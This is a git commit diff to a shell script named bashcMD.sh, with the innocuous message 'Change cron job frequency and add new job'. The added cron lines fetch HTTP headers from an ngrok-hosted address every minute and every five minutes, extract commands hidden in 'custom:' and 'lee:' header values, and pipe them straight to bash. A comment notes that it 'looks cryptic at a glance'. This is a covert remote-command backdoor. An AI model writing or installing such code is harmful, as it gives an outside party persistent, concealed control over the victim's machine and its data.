e600aeee548f5ca44280f25e14ea70ec6c5106cb
MOZZES650 <110117895+MOZZES650@users.noreply.github.com>
2025-12-21 16:36:19 +0100

    Change cron job frequency and add new job

--- bashcMD.sh
+++ bashcMD.sh
@@ -4,4 +4,5 @@ curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:
 #cron job
 
 # Looks cryptic at a glance
-*/10 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
+*/1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
+*/5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^lee:' | cut -d':' -f2- | xargs | bash
